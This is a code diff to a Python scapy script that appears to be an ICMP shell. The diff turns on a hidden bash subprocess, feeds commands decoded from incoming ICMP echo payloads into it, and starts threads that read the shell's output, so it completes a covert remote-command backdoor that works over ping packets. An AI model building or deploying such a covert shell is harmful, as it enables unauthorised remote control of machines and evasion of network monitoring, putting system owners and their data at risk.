@@ -1,6 +1,8 @@
 import argparse
 import socket
+import subprocess
 import sys
+import threading
 
 from scapy.layers.inet import IP, ICMP
 from scapy.layers.l2 import Ether
@@ -10,13 +12,13 @@ import ishell
 
 output = None
 error = None
-#p = subprocess.Popen(
-#    "cmd.exe",
-#    stdout=subprocess.PIPE,
-#    stdin=subprocess.PIPE,
-#    stderr=subprocess.PIPE,
-#    shell=True
-#)
+p = subprocess.Popen(
+    "bash",
+    stdout=subprocess.PIPE,
+    stdin=subprocess.PIPE,
+    stderr=subprocess.PIPE,
+    shell=True
+)
 destination_ip = ""
 source_ip = ""
 destination_mac = "ff:ff:ff:ff:ff:ff"
@@ -67,10 +69,7 @@ def packet_callback(packet):
         source_mac = packet[Ether].dst
         received_data = packet[ICMP].payload.load.decode('utf-8')
         print("-----+ OUT DATA +-----")
-        #sendcommand(received_data)
-        reply_packet = IP(dst=destination_ip) / ICMP(type=0,
-                                                     id=1515) / "hello"
-        send(reply_packet, verbose=False)
+        sendcommand(received_data)
 
 
 def main():
@@ -93,11 +92,11 @@ def main():
         ishell.ish_info.packetsize = args.p
     if args.d:
         ish_debug = 0
-    #t1 = threading.Thread(target=readstdout)
-    #t2 = threading.Thread(target=readstderr)
-#
-    #t1.start()
-    #t2.start()
+    t1 = threading.Thread(target=readstdout)
+    t2 = threading.Thread(target=readstderr)
+
+    t1.start()
+    t2.start()
 
     if (ish_debug):
         # if edaemon():
